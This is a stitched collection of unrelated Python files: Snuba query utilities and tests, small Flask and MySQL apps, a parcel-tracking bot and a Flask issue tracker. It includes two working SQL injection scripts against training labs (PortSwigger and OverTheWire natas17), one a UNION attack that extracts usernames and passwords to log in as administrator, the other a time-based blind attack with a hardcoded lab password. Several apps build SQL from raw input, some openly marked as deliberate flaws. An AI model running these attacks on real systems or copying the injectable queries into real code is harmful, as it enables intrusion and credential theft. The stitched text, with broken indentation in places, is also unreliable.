                dt = datetime(*(d[col['name']].timetuple()[:6])).replace(tzinfo=tz.tzutc())
                d[col['name']] = dt.isoformat()

    return (data, meta)


def validate_request(schema):
    """
    Decorator to validate that a request body matches the given schema.
    """
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):

            def default_encode(value):
                if callable(value):
                    return value()
                else:
                    raise TypeError()

            if request.method == 'POST':
                try:
                    body = json.loads(request.data)
                    schemas.validate(body, schema)
                    kwargs['validated_body'] = body
                    if kwargs.get('timer'):
                        kwargs['timer'].mark('validate_schema')
                except (ValueError, jsonschema.ValidationError) as e:
                    result = {'error': {
                        'type': 'schema',
                        'message': str(e),
                    }, 'schema': schema}
                    return (
                        json.dumps(result, sort_keys=True, indent=4, default=default_encode),
                        400,
                        {'Content-Type': 'application/json'}
                    )
            return func(*args, **kwargs)
        return wrapper
    return decorator


class Timer(object):
    def __init__(self, name=''):
        self.marks = [(name, time.time())]
        self.final = None

    def mark(self, name):
        self.final = None
        self.marks.append((name, time.time()))

    def finish(self):
        if not self.final:
            start = self.marks[0][1]
            end = time.time() if len(self.marks) == 1 else self.marks[-1][1]
            diff_ms = lambda start, end: int((end - start) * 1000)
            durations = [(name, diff_ms(self.marks[i][1], ts)) for i, (name, ts) in enumerate(self.marks[1:])]
            self.final = {
                'timestamp': int(start),
                'duration_ms': diff_ms(start, end),
                'marks_ms': {
                    key: sum(d[1] for d in group) for key, group in groupby(sorted(durations), key=lambda x: x[0])
                }
            }
        return self.final

    def for_json(self):
        return self.finish()

    def send_metrics_to(self, metrics):
        name = self.marks[0][0]
        final = self.finish()
        metrics.timing(name, final['duration_ms'])
        for mark, duration in six.iteritems(final['marks_ms']):
            metrics.timing('{}.{}'.format(name, mark), duration)


def time_request(name):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            kwargs['timer'] = Timer(name)
            return func(*args, **kwargs)
        return wrapper
    return decorator


def decode_part_str(part_str):
    match = PART_RE.match(part_str)
    if not match:
        raise ValueError("Unknown part name/format: " + str(part_str))

    date_str, retention_days = match.groups()
    date = datetime.strptime(date_str, '%Y-%m-%d')

    return (date, int(retention_days))


def force_bytes(s):
    if isinstance(s, bytes):
        return s
    return s.encode('utf-8', 'replace')


def create_metrics(host, port, prefix, tags=None):
    """Create a DogStatsd object with the specified prefix and tags. Prefixes
    must start with `snuba.<category>`, for example: `snuba.processor`."""

    from datadog import DogStatsd

    bits = prefix.split('.', 2)
    assert len(bits) >= 2 and bits[0] == 'snuba', "prefix must be like `snuba.<category>`"

    return DogStatsd(host=host, port=port, namespace=prefix, constant_tags=tags)


metrics = create_metrics(settings.DOGSTATSD_HOST, settings.DOGSTATSD_PORT, 'snuba.api')

from datetime import date, datetime
import simplejson as json
import time

from base import BaseTest

from snuba.util import (
    all_referenced_columns,
    column_expr,
    complex_column_expr,
    conditions_expr,
    escape_literal,
    tuplify,
    Timer,
)


class TestUtil(BaseTest):

    def test_column_expr(self):
        body = {
            'granularity': 86400
        }
        # Single tag expression
        assert column_expr('tags[foo]', body.copy()) ==\
            "(tags.value[indexOf(tags.key, \'foo\')] AS `tags[foo]`)"

        # Promoted tag expression / no translation
        assert column_expr('tags[server_name]', body.copy()) ==\
            "(server_name AS `tags[server_name]`)"

        # Promoted tag expression / with translation
        assert column_expr('tags[app.device]', body.copy()) ==\
            "(app_device AS `tags[app.device]`)"

        # All tag keys expression
        assert column_expr('tags_key', body.copy()) == (
            '(arrayJoin(tags.key) AS tags_key)'
        )

        # If we are going to use both tags_key and tags_value, expand both
        tag_group_body = {
            'groupby': ['tags_key', 'tags_value']
        }
        assert column_expr('tags_key', tag_group_body) == (
            '(((arrayJoin(arrayMap((x,y) -> [x,y], tags.key, tags.value)) '
            'AS all_tags))[1] AS tags_key)'
        )

        assert column_expr('time', body.copy()) ==\
            "(toDate(timestamp) AS time)"

        assert column_expr('col', body.copy(), aggregate='sum') ==\
            "(sum(col) AS col)"

        assert column_expr(None, body.copy(), alias='sum', aggregate='sum') ==\
            "sum"  # This should probably be an error as its an aggregate with no column

        assert column_expr('col', body.copy(), alias='summation', aggregate='sum') ==\
            "(sum(col) AS summation)"

        # Special cases where count() doesn't need a column
        assert column_expr('', body.copy(), alias='count', aggregate='count()') ==\
            "(count() AS count)"

        assert column_expr('', body.copy(), alias='aggregate', aggregate='count()') ==\
            "(count() AS aggregate)"

        # Columns that need escaping
        assert column_expr('sentry:release', body.copy()) == '`sentry:release`'

        # Columns that start with a negative sign (used in orderby to signify
        # sort order) retain the '-' sign outside the escaping backticks (if any)
        assert column_expr('-timestamp', body.copy()) == '-timestamp'
        assert column_expr('-sentry:release', body.copy()) == '-`sentry:release`'

        # A 'column' that is actually a string literal
        assert column_expr('\'hello world\'', body.copy()) == '\'hello world\''

        # Complex expressions (function calls) involving both string and column arguments
        assert column_expr(tuplify(['concat', ['a', '\':\'', 'b']]), body.copy()) == 'concat(a, \':\', b)'

        group_id_body = body.copy()
        assert column_expr('issue', group_id_body) == '(group_id AS issue)'

    def test_alias_in_alias(self):
        body = {
            'groupby': ['tags_key', 'tags_value']
        }
        assert column_expr('tags_key', body) == (
            '(((arrayJoin(arrayMap((x,y) -> [x,y], tags.key, tags.value)) '
            'AS all_tags))[1] AS tags_key)'
        )

        # If we want to use `tags_key` again, make sure we use the
        # already-created alias verbatim
        assert column_expr('tags_key', body) == 'tags_key'
        # If we also want to use `tags_value`, make sure that we use
        # the `all_tags` alias instead of re-expanding the tags arrayJoin
        assert column_expr('tags_value', body) == '((all_tags)[2] AS tags_value)'

    def test_escape(self):
        assert escape_literal("'") == r"'\''"                    
        assert escape_literal(date(2001, 1, 1)) == "toDate('2001-01-01')"
        assert escape_literal(datetime(2001, 1, 1, 1, 1, 1)) == "toDateTime('2001-01-01T01:01:01')"
        assert escape_literal([1, 'a', date(2001, 1, 1)]) ==\
            "(1, 'a', toDate('2001-01-01'))"

    def test_conditions_expr(self):
        conditions = [['a', '=', 1]]
        assert conditions_expr(conditions, {}) == 'a = 1'

        conditions = [[['a', '=', 1]]]
        assert conditions_expr(conditions, {}) == 'a = 1'

        conditions = [['a', '=', 1], ['b', '=', 2]]
        assert conditions_expr(conditions, {}) == 'a = 1 AND b = 2'

        conditions = [[['a', '=', 1], ['b', '=', 2]]]
        assert conditions_expr(conditions, {}) == '(a = 1 OR b = 2)'

        conditions = [[['a', '=', 1], ['b', '=', 2]], ['c', '=', 3]]
        assert conditions_expr(conditions, {}) == '(a = 1 OR b = 2) AND c = 3'

        conditions = [[['a', '=', 1], ['b', '=', 2]], [['c', '=', 3], ['d', '=', 4]]]
        assert conditions_expr(conditions, {}) == '(a = 1 OR b = 2) AND (c = 3 OR d = 4)'

        # Malformed condition input
        conditions = [[['a', '=', 1], []]]
        assert conditions_expr(conditions, {}) == 'a = 1'

        # Test column expansion
        conditions = [[['tags[foo]', '=', 1], ['b', '=', 2]]]
        expanded = column_expr('tags[foo]', {})
        assert conditions_expr(conditions, {}) == '({} = 1 OR b = 2)'.format(expanded)

        # Test using alias if column has already been expanded in SELECT clause
        reuse_body = {}
        conditions = [[['tags[foo]', '=', 1], ['b', '=', 2]]]
        column_expr('tags[foo]', reuse_body)  # Expand it once so the next time is aliased
        assert conditions_expr(conditions, reuse_body) == '(`tags[foo]` = 1 OR b = 2)'

        # Test special output format of LIKE
        conditions = [['primary_hash', 'LIKE', '%foo%']]
        assert conditions_expr(conditions, {}) == 'primary_hash LIKE \'%foo%\''

        conditions = tuplify([[['notEmpty', ['arrayElement', ['exception_stacks.type', 1]]], '=', 1]])
        assert conditions_expr(conditions, {}) == 'notEmpty(arrayElement(exception_stacks.type, 1)) = 1'

        conditions = tuplify([[['notEmpty', ['tags[sentry:user]']], '=', 1]])
        assert conditions_expr(conditions, {}) == 'notEmpty((`sentry:user` AS `tags[sentry:user]`)) = 1'

        conditions = tuplify([[['notEmpty', ['tags_key']], '=', 1]])
        assert conditions_expr(conditions, {}) == 'notEmpty((arrayJoin(tags.key) AS tags_key)) = 1'

        conditions = tuplify([
            [
                [['notEmpty', ['tags[sentry:environment]']], '=', 'dev'], [['notEmpty', ['tags[sentry:environment]']], '=', 'prod']
            ],
            [
                [['notEmpty', ['tags[sentry:user]']], '=', 'joe'], [['notEmpty', ['tags[sentry:user]']], '=', 'bob']
            ],
        ])
        assert conditions_expr(conditions, {}) == \
                """(notEmpty((tags.value[indexOf(tags.key, 'sentry:environment')] AS `tags[sentry:environment]`)) = 'dev' OR notEmpty(`tags[sentry:environment]`) = 'prod') AND (notEmpty((`sentry:user` AS `tags[sentry:user]`)) = 'joe' OR notEmpty(`tags[sentry:user]`) = 'bob')"""

        # Test scalar condition on array column is expanded as an iterator.
        conditions = [['exception_frames.filename', 'LIKE', '%foo%']]
        assert conditions_expr(conditions, {}) == 'arrayExists(x -> assumeNotNull(x LIKE \'%foo%\'), exception_frames.filename)'

        # Test negative scalar condition on array column is expanded as an all() type iterator.
        conditions = [['exception_frames.filename', 'NOT LIKE', '%foo%']]
        assert conditions_expr(conditions, {}) == 'arrayAll(x -> assumeNotNull(x NOT LIKE \'%foo%\'), exception_frames.filename)'

    def test_duplicate_expression_alias(self):
        body = {
            'aggregations': [
                ['topK(3)', 'logger', 'dupe_alias'],
                ['uniq', 'environment', 'dupe_alias'],
            ]
        }
        # In the case where 2 different expressions are aliased
        # to the same thing, one ends up overwriting the other.
        # This may not be ideal as it may mask bugs in query conditions
        exprs = [
            column_expr(col, body, alias, agg)
            for (agg, col, alias) in body['aggregations']
        ]
        assert exprs == ['(topK(3)(logger) AS dupe_alias)', 'dupe_alias']

    def test_complex_conditions_expr(self):
        body = {}

        assert complex_column_expr(tuplify(['count', []]), body.copy()) == 'count()'
        assert complex_column_expr(tuplify(['notEmpty', ['foo']]), body.copy()) == 'notEmpty(foo)'
        assert complex_column_expr(tuplify(['notEmpty', ['arrayElement', ['foo', 1]]]), body.copy()) == 'notEmpty(arrayElement(foo, 1))'
        assert complex_column_expr(tuplify(['foo', ['bar', ['qux'], 'baz']]), body.copy()) == 'foo(bar(qux), baz)'
        assert complex_column_expr(tuplify(['foo', [], 'a']), body.copy()) == '(foo() AS a)'
        assert complex_column_expr(tuplify(['foo', ['b', 'c'], 'd']), body.copy()) == '(foo(b, c) AS d)'
        assert complex_column_expr(tuplify(['foo', ['b', 'c', ['d']]]), body.copy()) == 'foo(b, c(d))'

        # we may move these to special Snuba function calls in the future
        assert complex_column_expr(tuplify(['topK', [3], ['project_id']]), body.copy()) == 'topK(3)(project_id)'
        assert complex_column_expr(tuplify(['topK', [3], ['project_id'], 'baz']), body.copy()) == '(topK(3)(project_id) AS baz)'

        assert complex_column_expr(tuplify(['emptyIfNull', ['project_id']]), body.copy()) == 'ifNull(project_id, \'\')'
        assert complex_column_expr(tuplify(['emptyIfNull', ['project_id'], 'foo']), body.copy()) == '(ifNull(project_id, \'\') AS foo)'

        assert complex_column_expr(tuplify(['positionCaseInsensitive', ['message', "'lol 'single' quotes'"]]), body.copy()) == "positionCaseInsensitive(message, 'lol \\'single\\' quotes')"

    def test_referenced_columns(self):
        # a = 1 AND b = 1
        body = {
            'conditions': [
                ['a', '=', '1'],
                ['b', '=', '1'],
            ]
        }
        assert all_referenced_columns(body) == set(['a', 'b'])

        # a = 1 AND (b = 1 OR c = 1)
        body = {
            'conditions': [
                ['a', '=', '1'],
                [
                    ['b', '=', '1'],
                    ['c', '=', '1'],
                ],
            ]
        }
        assert all_referenced_columns(body) == set(['a', 'b', 'c'])

        # a = 1 AND (b = 1 OR foo(c) = 1)
        body = {
            'conditions': [
                ['a', '=', '1'],
                [
                    ['b', '=', '1'],
                    [['foo', ['c']], '=', '1'],
                ],
            ]
        }
        assert all_referenced_columns(body) == set(['a', 'b', 'c'])

        # a = 1 AND (b = 1 OR foo(c, bar(d)) = 1)
        body = {
            'conditions': [
                ['a', '=', '1'],
                [
                    ['b', '=', '1'],
                    [['foo', ['c', ['bar', ['d']]]], '=', '1'],
                ],
            ]
        }
        assert all_referenced_columns(body) == set(['a', 'b', 'c', 'd'])

        # Other fields, including expressions in selected columns
        body = {
            'arrayjoin': 'tags_key',
            'groupby': ['time', 'issue'],
            'orderby': '-time',
            'selected_columns': [
                'issue',
                'time',
                ['foo', ['c', ['bar', ['d']]]] # foo(c, bar(d))
            ],
            'aggregations': [
                ['uniq', 'tags_value', 'values_seen']
            ]
        }
        assert all_referenced_columns(body) == set(['tags_key', 'tags_value', 'time', 'issue', 'c', 'd'])

    def test_timer(self):
        t = Timer()
        time.sleep(0.001)
        t.mark('thing1')
        time.sleep(0.001)
        t.mark('thing2')
        snapshot = t.finish()

        # Test that we can add more time under the same marks and the time will
        # be cumulatively added under those keys.
        time.sleep(0.001)
        t.mark('thing1')
        time.sleep(0.001)
        t.mark('thing2')
        snapshot_2 = t.finish()

        assert snapshot['marks_ms'].keys() == snapshot_2['marks_ms'].keys()
        assert snapshot['marks_ms']['thing1'] < snapshot_2['marks_ms']['thing1']
        assert snapshot['marks_ms']['thing2'] < snapshot_2['marks_ms']['thing2']

import pymysql
import dbconfig


class DBHelper:

    def connect(self, database="crimemap"):
        return pymysql.connect(host='localhost',
               user=dbconfig.db_user,
               passwd=dbconfig.db_password,
               db=database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = "SELECT description FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
            return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection = self.connect()
        try:
            # The following introduces a deliberate security flaw. 
            # See section on SQL injection below
            query = "INSERT INTO crimes (description) VALUES('{}');".format(data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection = self.connect()
        try:
            query = "DELETE FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

#!/usr/bin/python
# coding:utf-8

import pycurl
import certifi
import StringIO
import json
import db

# 0	Transporting	Express is being transported
# 1	Accepted	Express is accepted by the express company
# 2	Trouble	Express is in knotty problem
# 3	Delivered	Express is successfully delivered
# 4	Rejected	Express is rejected by the receiver and has been successfully redelivered to the sender
# 5	Delivering	Express is being delivered
# 6	Rejecting	Express is rejected by the receiver and is being redelivered to the sender

state = {'0': 'Transporting', '1': 'Accepted', '2': 'Trouble', '3': 'Delivered', '4': 'Rejected', '5': 'Delivering',
         '6': 'Rejecting'}

result = StringIO.StringIO()                    

c = pycurl.Curl()
c.setopt(pycurl.CAINFO, certifi.where())
c.setopt(pycurl.WRITEFUNCTION, result.write)                    


def auto_detect(track_id):                    
    url = 'http://www.kuaidi100.com/autonumber/autoComNum'                    
    c.setopt(pycurl.CUSTOMREQUEST, 'POST')                    
    try:
        c.setopt(pycurl.URL, url + '?text=' + track_id)                    
        c.perform()
    except UnicodeEncodeError:
        pass

    try:
        return json.loads(result.getvalue()).get('auto')[0].get('comCode')
    except (IndexError, ValueError):
        return False


def query_express_status(com, track_id):
    url = 'http://www.kuaidi100.com/query'
    c.setopt(pycurl.CUSTOMREQUEST, 'GET')
    c.setopt(pycurl.URL, url + '?type=' + com + '&postid=' + track_id)
    c.perform()
    s = result.getvalue()                    
    return json.loads(s[s.index('}]}') + 3:])                    


def recv(code, *args):
    # check if this track is done
    # No result in database would return none, so do a query and insert

    # TODO: SQL Injection
    try:
        db_res = db.select("SELECT * FROM job WHERE track_id='%s'" % code)[0]
    except IndexError:
        db_res = db.select("SELECT * FROM job WHERE track_id='%s'" % code)

    if len(db_res) == 0:
        com_code = auto_detect(code)
        if not com_code:
            return 'My dear, I think you have entered a wrong number.'
        res = query_express_status(com_code, code)

        done = 1 if (res.get('state') == '3' or res.get('state') == '4') else 0
        try:
            sql_cmd = "INSERT INTO job VALUES (%s,'%s','%s','%s','%s','%s','%s','%s','%s')" % \
                      ('null', args[0], args[1], com_code, code, res.get('data')[0].get('context'),
                       state.get(res.get('state')), res.get('data')[0].get('time'), done)

            db.upsert(sql_cmd)
            return code + '\n' + res.get('data')[0].get('time') + ' ' + res.get('data')[0].get('context')
        except IndexError:
            return res.get('message')
    elif db_res[8] == 0:
        com_code = auto_detect(code)
        if not com_code:
            return 'My dear, I think you have entered a wrong number.'
        res = query_express_status(com_code, code)
        done = 1 if (res.get('state') == '3' or res.get('state') == '4') else 0
        try:
            sql_cmd = "UPDATE job set content='%s',status='%s',date='%s',done='%s' WHERE track_id='%s'" % \
                      (res.get('data')[0].get('context'),
                       state.get(res.get('state')),
                       res.get('data')[0].get('time'),
                       done,
                       code)
            db.upsert(sql_cmd)
            return code + '\n' + res.get('data')[0].get('time') + ' ' + res.get('data')[0].get('context')
        except IndexError:
            return res.get('message')
    else:
        return db_res[4] + '\n' + db_res[7] + ' ' + db_res[5]


def list_query(un):
    cmd = "SELECT track_id,date,content FROM job WHERE username='%s'" % un
    return db.select(cmd)


def delete(tid):
    cmd = "DELETE FROM job WHERE track_id='%s'" % tid
    if db.upsert(cmd) == 1:
        return 'Delete succeed'
    else:
        return 'The ID you entered is not available.'


if __name__ == '__main__':
    print recv('***REMOVED***', 'BennyThink', 260260121)
    # print recv('***REMOVED***', 'BennyThink', 260260121)
    # list_query('BennyThink')
    # delete('***REMOVED***')

#!/usr/bin/python
# coding:utf-8

import db
import main

if __name__ == '__main__':

    sql_cmd = 'SELECT track_id,username,chat_id FROM job WHERE done=0'                    
    s = db.select(sql_cmd)                    

    for i in s:
        main.cron(i[0], i[1], i[2])

import pymysql
import dbconfig

class DBHelper():
    def connect(self, database = 'crimemap'):
        return pymysql.connect(
                host = 'localhost',
                user = dbconfig.db_user,
                passwd = dbconfig.db_password,
                db = database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = "SELECT description FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
            return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection = self.connect()
        try:
            # WARNING SECURITY FLAW
            query = "INSERT INTO crimes (description) VALUES ('{}');".format(data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection = self.connect()
        try:
            query = "DELETE FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()



#!/usr/bin/env python3
import requests                    
import sys
from bs4 import BeautifulSoup
import re                    

# Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

# API Parameters
url = 'https://abcd.web-security-academy.net/'
url = f'{url}page'
params = {'category': 'Lifestyle'}
null = ["'UNION SELECT", 'NULL', '--']
sqli = {'category': f"Lifestyle{' '.join(null)}"}

# API Request
api_session = requests.Session()
response = api_session.get(url, params=params)

if response.status_code == 404:
    sys.exit('The session you are looking for has expired')


def sqli_union_lab_1(null, sqli):
    """
    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing null values.
    :param null: Copy of global null variable
    :param sqli: Copy of global sqli variable
    :return:
    """
    # Perform a new requests with sqli parameters
    lab1 = api_session.get(url, params=sqli)

    while not lab1.ok:
        # Remove '--' then add ', NULL --' until lab1.ok is True
        null.remove('--')
        null.extend([',', 'NULL', '--'])

        # Perform a new request with the updated list
        sqli['category'] = f"Lifestyle{' '.join(null)}"
        lab1 = api_session.get(url, params=sqli)

    print(f"There are {null.count('NULL')} columns")

    # Return null since it now has the amount of NULL's required to exploit the application
    return null


def sqli_union_lab_2(lab2, null, sqli):
    """
    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value
    provided.
    :param lab2: Global response variable
    :param null: Copy of global null variable
    :param sqli: Copy of global sqli variable
    :return:
    """
    # # Parse the HTML output using Beautiful Soup to grab the secret value
    # html = BeautifulSoup(lab2.text, 'html.parser')
    # secret_string = html.find('p', {'id': 'hint'}).contents[0]
    # secret_value = re.search("['].*[']", secret_string)
    secret_value = [f"{'VULNERABLE_STRING'!r}"]

    # Perform a new request with sqli parameters
    lab2 = api_session.get(url, params=sqli)
    # Initialize column variable for accurate column count
    column = 1
    # Retrieve the location of the first 'NULL'
    step = null.index('NULL')

    while not lab2.ok:
        # Replace each NULL with the secret_value until lab2.ok is True.
        index = null.index('NULL', step)
        null[index] = secret_value[0]

        # Perform a new request with the updated parameters
        sqli['category'] = f"Lifestyle{' '.join(null)}"
        lab2 = api_session.get(url, params=sqli)

        if not lab2.ok:
            # Replace the secret_value with NULL if lab2.ok is still False
            null[index] = "NULL"
            # Increase step by 1 to find the next NULL
            step = (index + 1)
            # Increase column by 1 for accurate column count
            column += 1
    print(f'Column {column} contains inserted text')

    # Return the index where the secret value appeared within the query results
    return index


def sqli_union_lab_3(null, index, url):
    """
    To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords,
    and use the information to log in as the administrator user.
    :param null: Copy of global null variable
    :param index: Global index variable where the secret value appeared within the query results
    :param url: Global url variable
    :return:
    """
    pass


def sqli_union_lab_4(null, index, url):
    """
    To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords,
    and use the information to log in as the administrator user.
    :param null: Copy of global null variable
    :param index: Global index variable where the secret value appeared within the query results
    :param url: Global url variable
    :return:
    """
    # Insert new SQLi query where a given value will appear within the query results
    null[index] = "username || ':' || password FROM users--"
    # Remove unused NULL values
    del (null[index + 1:])

    # Perform a new request with the updated parameters. Exclude the category to return only usernames and passwords
    sqli['category'] = f"{' '.join(null)}"
    lab4 = api_session.get(url, params=sqli)

    # Parse the HTML output using Beautiful Soup and create a dictionary with username/password combinations
    html = BeautifulSoup(lab4.text, 'html.parser')
    up_combo = [up.contents[0] for up in html(['th'])]
    user_pass = dict(up.split(':') for up in up_combo)

    # Perform a GET request against /login to grab the csrfToken
    url = url.replace('/page', '/login')
    lab4 = api_session.get(url)
    html = BeautifulSoup(lab4.text, 'html.parser')
    csrfToken = html.find('input', {'name': 'csrf'})['value']

    # Authenticate using credentials scraped from the HTML output
    payload = {'username': 'administrator', 'password': user_pass['administrator'], 'csrf': csrfToken}
    lab4 = api_session.post(url, data=payload)

    return lab4

if __name__ == '__main__':
    null = sqli_union_lab_1(null=null.copy(), sqli=sqli.copy())
    index = sqli_union_lab_2(lab2=response, null=null.copy(), sqli=sqli.copy())
    # sqli_union_lab_3(null=null.copy(), index=index, url=url)
    login = sqli_union_lab_4(null=null.copy(), index=index, url=url)

import sqlite3

db = sqlite3.connect("contacts.sqlite")

for row in db.execute("SELECT * FROM contacts"):                    
    print(row)

db.close()

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
from string import ascii_lowercase, ascii_uppercase, digits
from time import time

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth = (username, password))
# response = session.post(url, data = {"username": "natas18"}, auth = (username, password) )

seen_password = list()
while ( len(seen_password) < 32 ):                    

	for character in characters:
		start_time = time()

		print("trying", "".join(seen_password) + character)
		response = session.post(url, data = {"username": 'natas18" AND BINARY password LIKE "' + "".join(seen_password) + character +  '%" AND SLEEP(1) # '}, auth = (username, password) )                    
        content = response.text                    
		end_time = time()
		difference = end_time - start_time
		

		if ( difference > 1 ):
			# success, correct character!
			seen_password.append(character)
			break
        print(content)                    

from flask import Flask, g, jsonify, request
from jsonschema import validate, ValidationError

import argparse
import functools
import sqlite3

"""                    
[todo] Replace query string concatenations with DB-API‚Äôs parameter                    
substitution to avoid SQL injection attacks.                    
"""                    

app = Flask(__name__)
DATABASE_FILE = "./tissue.db"
SCHEMA_FILE = "./schema.sql"

def validate_request_payload(require_id=False):
    """                    
    Function decorator that validates a request payload against the JSON
    schema. If `require_id` is True, then the issue definition will
    require an `id` property.
    """                    
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            request_schema = {
                "$schema": "http://json-schema.org/draft-07/schema#",
                "definitions": {
                    "tag": {
                        "type": "object",
                        "required": [
                            "namespace",
                            "predicate",
                            "value",
                        ],
                        "properties": {
                            "namespace": {
                                "type": "string",
                            },
                            "predicate": {
                                "type": "string",
                            },
                            "value": {
                                "type": ["number", "string"],
                            },
                        },
                    },
                    "issue": {
                        "type": "object",
                        "required": ["title"],
                        "properties": {
                            "title": {
                                "type": "string",
                            },
                            "description": {
                                "type": "string",
                            },
                            "tags": {
                                "type": "array",
                                "default": [],
                                "minItems": 0,
                                "items": {
                                    "$ref": "#/definitions/tag",
                                },
                            },
                        },
                    },
                },
            }

            # Patch the JSON schema with an added required `id` property in the issue
            # definition for the UPDATE, PATCH, and DELETE operations; which require
            # the `id` property to identity which issues to modify or delete.
            if require_id:
                request_schema["definitions"]["issue"]["required"].append("id")
                request_schema["definitions"]["issue"]["properties"]["id"] = {
                    "type": ["integer", "string"],
                }

            request_schema = {
                **request_schema,
                **{
                    "type": "object",
                    "properties": {
                        "data": {
                            "type": "array",
                            "minItems": 1,
                            "items": {
                                "$ref": "#/definitions/issue",
                            },
                        },
                    },
                },
            }

            request_payload = request.get_json()
            try:
                validate(
                    instance=request_payload,
                    schema=request_schema,
                )
            except ValidationError:
                return jsonify({
                    "data": [],
                    "errors": ["failed to validate payload against json schema"],
                }), 400

            return func(*args, **kwargs)
        return wrapper
    return decorator

def get_database_connection():
    """                    
    Get a SQLite database connection from the application context.
    """                    
    connection = getattr(g, "database", None)
    if connection is None:
        g.database = sqlite3.connect(DATABASE_FILE)
        connection = g.database
        connection.row_factory = sqlite3.Row

    return connection

@app.teardown_appcontext
def close_database_connection(exception):
    """                    
    Automatically closes the database connection resource in the
    application context at the end of a request.
    """                    
    connection = getattr(g, "database", None)
    if connection is not None:
        connection.close()

def fetch_issue(cursor, id):
    """                    
    Fetch an issue by id along with its tags. Returns None if no issue
    with the specified id exists in the database.
    """                    
    cursor.execute(f"""                                                            
        SELECT
            issue.id,
            issue.title,
            issue.description,
            tag.namespace,
            tag.predicate,
            tag.value
        FROM
            issue LEFT JOIN tag
            ON issue.id = tag.issue_id
        WHERE
            issue.id = {id}                    
    """)                                                            

    issue = None
    for row in cursor:
        if issue is None:
            issue = {
                "id": row["id"],
                "title": row["title"],
                "description": row["description"],
                "tags": [],
            }
        # If tag exists in row, add to issue.
        if row["value"]:
            issue["tags"].append({
                "namespace": row["namespace"],
                "predicate": row["predicate"],
                "value": row["value"],
            })

    return issue

def create_issue(cursor, issue):
    """                    
    Create an issue with tags.
    """                    
    cursor.execute(f"""                                                            
        INSERT INTO issue (
            title,
            description
        )
        VALUES (
            "{issue["title"]}",                    
            "{issue.get("description", "")}"                    
        )
    """)                                                            

    issue_id = cursor.lastrowid
    for tag in issue.get("tags", []):
        cursor.execute(f"""                                                            
            INSERT INTO tag (
                namespace,
                predicate,
                value,                    
                issue_id
            )
            VALUES (
                "{tag.get("namespace", "")}",                    
                "{tag.get("predicate", "")}",                    
                "{tag.get("value", "")}",                    
                "{issue_id}"                    
            )
        """)                                                            

    return issue_id


def update_issue(cursor, id, fields):
    """                    
    Update the issue specified by the id field.
    """                    
    updated_fields = {}
    if "title" in fields:
        updated_fields["title"] = fields["title"]
    if "description" in fields:
        updated_fields["description"] = fields["description"]

    set_clause_args = ", ".join(map(                    
        lambda kv: f"{kv[0]} = \"{kv[1]}\"",                    
        updated_fields.items(),                    
    ))                    

    if len(updated_fields) != 0:
        cursor.execute(f"""                                                            
            UPDATE issue                    
            SET {set_clause_args}                    
            WHERE id = {id}                    
        """)                                                            

    cursor.execute(f"""                                                            
        DELETE FROM tag                    
        WHERE issue_id = {id}                    
    """)                                                            

    for tag in fields.get("tags", []):
        cursor.execute(f"""                                                            
            INSERT INTO tag (
                namespace,
                predicate,
                value,                    
                issue_id
            )
            VALUES (
                "{tag["namespace"]}",                    
                "{tag["predicate"]}",                    
                "{tag["value"]}",                    
                "{id}"                    
            )
        """)                                                            

@app.route("/api/issue/<int:id>", methods=["GET"])
def issue_get_endpoint(id):
    cursor = get_database_connection().cursor()
    issue = fetch_issue(cursor, id)

    errors = []
    status_code = 200
    if issue is None:
        errors.append(f"issue #{id} does not exist")
        status_code = 404

    return jsonify({
        "data": list(issues.values()),                    
        "errors": errors,
    }), status_code

@app.route("/api/issue", methods=["POST"])
@validate_request_payload()
def issue_post_endpoint():
    # [todo] Validate the issue(s) against Prolog rules.

    # Attempt to create issues and tags in SQLite.
    # Rollback in the event of an exception.
    connection = get_database_connection()
    try:
        with connection:
            for issue in request.get_json()["data"]:
                create_issue(connection.cursor(), issue)
    except sqlite3.IntegrityError as error:
        return jsonify({
            "data": [],
            "errors": [
                "failed to create rows in sqlite",
                str(error),
            ],
        }), 400

    # [todo] Return the created issue(s).

    return "Not implemented.", 501

@app.route("/api/issue", methods=["PUT"])
@validate_request_payload(require_id=True)
def issue_put_endpoint():
    # [todo] Validate the issue(s) against Prolog rules.

    connection = get_database_connection()
    try:
        with connection:
            cursor = connection.cursor()
            for issue in request.get_json().get("data", {}):
                fetched_issue = fetch_issue(cursor, issue.get("id", -1))                    
                if fetched_issue is None:
                    create_issue(cursor, issue)
                else:
                    # Ensure that all fields are being updated. PUT has
                    # replace semantics. For updating a subset of fields,
                    # PATCH should be used.
                    if "title" not in issue:
                        issue["title"] = ""
                    if "description" not in issue:
                        issue["description"] = ""
                    if "tags" not in issue:
                        issue["tags"] = []
                    update_issue(cursor, issue["id"], issue)
    except Exception as error:
        print(error)
        return jsonify({"error": str(error)}), 500

    # [todo] Return the patched issue(s).

    return "Not implemented.", 501

@app.route("/api/issue", methods=["PATCH"])
@app.route("/api/issue/<int:id>", methods=["PATCH"])
def issue_patch_endpoint(id):
    return "Not implemented.", 501

@app.route("/api/issue/<int:id>", methods=["DELETE"])
